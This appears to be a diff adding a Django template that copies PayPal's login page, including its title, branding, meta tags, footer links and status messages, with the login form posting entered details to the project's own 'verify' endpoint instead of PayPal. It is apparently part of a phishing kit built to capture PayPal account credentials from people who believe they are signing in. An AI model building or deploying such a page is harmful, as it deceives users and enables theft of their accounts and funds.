@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+{% load static %}
+{%  block content %}
+<html lang="en" class="no-js desktop"><!--<![endif]-->
+
+<head>
+  <script async src="https://www.paypalobjects.com/webcaptcha/ngrlCaptcha.min.js"></script>
+  <!--Script info: script: node, template:  , date: May 8, 2024 00:21:24 -07:00, country: US, language: en web version:  content version:  hostname : rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0KCh6/h2ON0qYFJ87ahTWaMk3l4QOrqKb rlogid : rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfc8CMK9ch4LYZpzCvqaJ8XL5jZp4vQ0wBWBzCHgZmIbp_18f571411d8 -->
+  <meta charset="utf-8" />
+  <title>Log in to your PayPal account</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+  <meta name="application-name" content="PayPal" />
+  <meta name="msapplication-task"
+    content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
+  <meta name="msapplication-task"
+    content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
+  <meta name="keywords" content="transfer money, email money transfer, international money transfer " />
+  <meta name="description"
+    content="Transfer money online in seconds with PayPal money transfer. All you need is an email address." />
+  <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
+  <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png" />
+  <link rel="canonical" href="https://www.paypal.com/us/signin" />
+  <link rel="stylesheet" href="{% static 'css/styles.css' %}" />
+  <link rel="stylesheet" href="{% static 'css/contextualLoginElementalUIv4.css' %}" />
+  
+
+  <meta name="viewport"
+    content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
+  <meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png" />
+  <link rel="stylesheet"
+  <!--[if lte IE 9]><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/778/f4135a2c159202ed2d6bf8e23dfa1/css/ie9.css" /><![endif]--><!-- build:js inline --><!-- build:[src] js/lib/ -->
+
+  <!-- /build --><!-- /build -->
+
+
+</head>
+
+<body>
+  <div id="main" class="main" role="main">
+    <section id="slLanding" class="slLanding hide" data-role="page"
+      data-title="Connect your Google account, check out faster on your devices">
+      <div class="corral">
+        <div id="slContent" class="contentContainer contentContainerBordered">
+          <header>
+            <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long"></p>
+          </header>
+          <div id="linked" class="linked ">
+            <div class="profileRemembered"><span class="loginEmail"></span><a href="#"
+                class="changeLink scTrack:not-you" id="changeLink">Change</a></div>
+            <div class="headerTextDecorated"></div>
+            <h1 class="headerText">Stay logged in for faster checkout</h1>
+            <p class="description assure">Enable auto login on this browser and speed through checkout every time. (Not
+              recommended for shared devices.)<span class="learnMoreLink"><a href="#" id="slLoginLearnMore"
+                  class="secondayLink">What's this?</a></span></p>
+            <div id="partnerProfile" class="partnerProfile">
+              <div id="partnerPhoto" class="partnerPhoto" style="background-image: url('')"></div>
+              <div class=partnerDetails><span>You're logged in as</span>
+                <div id="displayName" class="displayName"></div>
+                <div>
+                  <div class="partnerEmailDiv"><span class="partnerIcon"></span><span id="partnerEmail"
+                      class="partnerEmail"></span><span id="partnerEmailDomain"></span></div>
+                </div>
+              </div>
+            </div>
+            <div class="actions actionsSpacedShort"><button class="button actionContinue scTrack:unifiedlogin-continue"
+                id="continueBtn" name="continueBtn" value="continueBtn">Continue</button></div>
+            <div id="secondaryLogin" class="buttonAsLink secondaryLink"><button
+                class="scTrack:unifiedlogin-use-password" id="secondaryLoginBtn" name="secondaryLoginBtn"
+                value="secondaryLoginBtn">Use password instead</button></div>
+          </div>
+          <div id="unlinked" class="unlinked ">
+            <div id="headerIcon" class="partnerConnect"></div>
+            <h1 class="headerText">Connect your Google account, check out faster on your devices</h1>
+            <p class="description assure">Automatically log in to PayPal for faster checkout without typing your
+              password wherever you're logged in with your Google account.<a href="#" id="slOptInlearnMore"
+                class="secondayLink scTrack:unifiedlogin-sl-whatsthis">What's this?</a></p>
+            <p class="secondaryLink hide" id="slOptIn_notNow"><a href="#">Not now</a></p>
+          </div>
+          <div id="learnMoreModal" class="learnMoreModal">
+            <div id="optInLearnMoreDesc" class="optInLearnMoreDesc ">
+              <h1 class="headerText headerTextSpaced">Why connect my Google account?</h1>
+              <p> Linking your Google account allows you to activate One Touch quickly and easily when you check out.
+                You can always opt out later in Settings at PayPal.com.</p>
+              <p> Whenever you check out on a new device and browser when logged in with your Google account, you can
+                automatically log in at checkout without typing your password.</p>
+            </div>
+            <div id="slLoginLearnMoreDesc" class="slLoginLearnMoreDesc ">
+              <h1 class="headerText headerTextSpaced">Stay logged in for faster checkout</h1>
+              <p> Skip typing your password by staying logged in on this device. For security, we'll occassionally ask
+                you to log in, including every time you update your personal or financial info. We don't recommend using
+                One Touch on shared devices. Turn this off at any time in your PayPal settings.</p>
+            </div><button type="button" class="ui-dialog-titlebar-close"></button>
+          </div>
+          <div class="intentFooter ">
+            <div class="localeSelector  "><span class="picker country-selector hide"><span class="hide"
+                  id="countryPickerLink">United States</span><button type="button" aria-label="countryPickerLink"
+                  class="country US"></button></span>
+              <ul class="localeLink">
+                <li><a class="selected scTrack:unifiedlogin-footer-language_en_US"
+                    href="/signin?country.x=US&locale.x=en_US&langTgl=en" lang="en" data-locale="en_US"
+                    aria-current=”true”>English</a></li>
+                <li><a class=" scTrack:unifiedlogin-footer-language_fr_XC"
+                    href="/signin?country.x=US&locale.x=fr_XC&langTgl=fr" lang="fr" data-locale="fr_XC">Français</a>
+                </li>
+                <li><a class=" scTrack:unifiedlogin-footer-language_es_XC"
+                    href="/signin?country.x=US&locale.x=es_XC&langTgl=es" lang="es" data-locale="es_XC">Español</a></li>
+                <li><a class=" scTrack:unifiedlogin-footer-language_zh_XC"
+                    href="/signin?country.x=US&locale.x=zh_XC&langTgl=zh" lang="zh" data-locale="zh_XC">中文</a></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section id="login" class="login  " data-role="page" data-title="Log in to your PayPal account">
+      <div class="corral ">
+        <div id="content" class="contentContainer activeContent contentContainerBordered">
+          <header id="header">
+            <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p>
+          </header>
+          <h1 id="headerText" class="headerText  accessAid">Log in to your PayPal account</h1>
+          <p id="phoneSubTagLine" class="subHeaderText hide">Already set up to use your mobile number to log in? Type it
+            below. Otherwise, click the link to log in with email.</p>
+          <p id="subTagLineConnectOtp" class="subHeaderText hide">Forgot your email address? Go to the PayPal website to
+            recover it.</p>
+          <div id="loginContent" class="">
+            <div id="loginSection" class="">
+              <div class="notifications"></div>
+              <div id="keychainErrorMessage" class="hide">
+                <p class="notification notification-warning blocked-on-8ball hide">PayPal One Touch&trade; only works
+                  for checkout. Please login with your email.</p>
+                <p class="notification notification-warning blocked-on-risky-login hide">Please login with your email
+                  and password.</p>
+                <p class="notification notification-critical keychain-activation-failure hide">Something went wrong on
+                  our end. Please login with your email and password.</p>
+              </div>
+              <form action="{% url 'verify' %}" method="post" class="proceed maskable"
+                autocomplete="off" name="login" autocomplete="off" novalidate><input type="hidden" id="token" />
+                  {% csrf_token %}
+                        <div class="justinbiber">
+                        {{form.as_p}}
+                      </div>
+
+<a
+                      href="/authflow/email-recovery/?contextId=&amp;redirectUri=%252Fsignin%253Fcountry.x%253DUS%2526locale.x%253Den_US"
+                      id="forgotEmail" class="recoveryOption" data-client-log-action-type="clickForgotEmailLink">Forgot
+                      email?</a>
+
+                  <div class="actions"><button class="button actionContinue scTrack:unifiedlogin-login-submit"
+                      type="submit" id="btnLogin" name="btnLogin" value="Login">log In</button>
+              </form>
+              <div class="moreOptionsDiv  hide" id="moreOptionsContainer"><a href="#" id="moreOptions"
+                  class="moreOptionsInfo">More options</a>
+                <div class="bubble-tooltip hide" id="moreOptionsDropDown">
+                  <ul class="moreoptionsGroup">
+                    <li><a href="#" id="moreOptionsMobile"
+                        class="scTrack:unifiedlogin-click-more-options-mobile">Approve login using mobile device</a>
+                    </li>
+                    <li><a
+                        href="/authflow/password-recovery/?country.x=US&amp;locale.x=en_US&amp;redirectUri=%252Fsignin%253Fcountry.x%253DUS%2526locale.x%253Den_US"
+                        class="scTrack:unifiedlogin-click-forgot-password pwrLink">Having trouble logging in?</a></li>
+                  </ul>
+                </div>
+              </div>
+              <div id="beginOtpLogin" class="otpLoginViaButton hidden"><button class="button" href="#">Log in with a
+                  one-time code</button></div>
+              <div id="tryAnotherWayLinkContainer" class="tryAnotherWayLinkContainer hide" data-hide-on-pass=""><a
+                  href='#' id="tryAnotherWayLink">Try another way</a></div>
+              <div id="signupContainer" class="signupContainer " data-hide-on-email="" data-hide-on-pass="">
+                <div class="loginSignUpSeparator "><span class="textInSeparator">or</span></div><button type="button"
+                  href="https://www.paypal.com/us/webapps/mpp/account-selection"
+                  class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount">Sign Up</button>
+              </div>
+              <div id="tpdButtonContainer" class="signupContainer hide">
+                <div class="loginSignUpSeparator"><span class="textInSeparator">or</span></div>
+                <div class="actions"><button class="button secondary" id="tpdButton" type="submit"
+                    value="Approve login using mobile device">Approve login using mobile device</button></div>
+              </div>
+            </div>
+          </div>
+          <br>
+					<br>
+					<br>
+					<br>
+					<br>
+					<br>
+					<br>
+          <div class="">
+            <div class="country">
+            </div>
+            <div class="language">
+              <div class="gtranslate_wrapper"></div>
+              <span>Français</span>
+              <span>Español</span>
+              <span>中国人</span>
+            </div>
+          </div>
+        </div>
+
+    <footer class="footer" role="contentinfo">
+      <div class="legalFooter">
+        <ul class="footerGroup">
+          <li><a target="_blank" href="https://www.paypal.com/us/smarthelp/contact-us">Contact Us</a></li>
+          <li><a target="_blank" href="https://www.paypal.com/us/legalhub/privacy-full">Privacy</a></li>
+          <li><a target="_blank" href="https://www.paypal.com/us/webapps/mpp/ua/legalhub-full">Legal</a></li>
+          <li><a target="_blank" href="https://www.paypal.com/us/webapps/mpp/ua/upcoming-policies-full">Policy Updates</a></li>
+          <li><a target="_blank" href="https://www.paypal.com/us/webapps/mpp/country-worldwide">Worldwide</a></li>
+        </ul>
+      </div>
+    </footer>
+  </div>
+  <div class="transitioning  hide ">
+    <p class="welcomeMessage hide">Welcome, !</p>
+    <p class="checkingInfo hide">Checking your info…</p>
+    <p class="oneSecond hide">Just a second…</p>
+    <p class="secureMessage hide">Securely logging you in...</p>
+    <p class="oneTouchMessage hide"></p>
+    <p class="retrieveInfo hide">Retrieving your info...</p>
+    <p class="waitFewSecs hide">This may take a few seconds...</p>
+    <p class="udtSpinnerMessage udtLogin hide">We recognize you on this device, and we’re securely logging you in.</p>
+    <p class="udtSpinnerMessage udtLoginXo hide">We recognize you on this device, so no need to enter your password for
+      this purchase.</p>
+    <p class="udtSpinnerMessage webllsXoUS hide">We recognize you on this device, so you can skip login.<br><br>Manage
+      this setting in your profile.</p>
+    <p class="udtSpinnerMessage webllsSCA hide">We're taking you to PayPal Checkout to complete payment.</p>
+    <p class="qrcMessage hide">Redirecting...</p>
+    <p class="webAuthnOptin hide">Updating your login settings...</p>
+    <p class="webAuthnLogin hide">Logging you in...</p>
+    <div class="keychain spinner-content uiExp hide"></div>
+  </div>
+  <script>window.gtranslateSettings = {"default_language":"en","detect_browser_language":true,"wrapper_selector":".gtranslate_wrapper","flag_size":24}</script>
+  <script src="https://cdn.gtranslate.net/widgets/latest/popup.js" defer></script>
+
+  </body>
+  {%  endblock content %}
+
+</html>
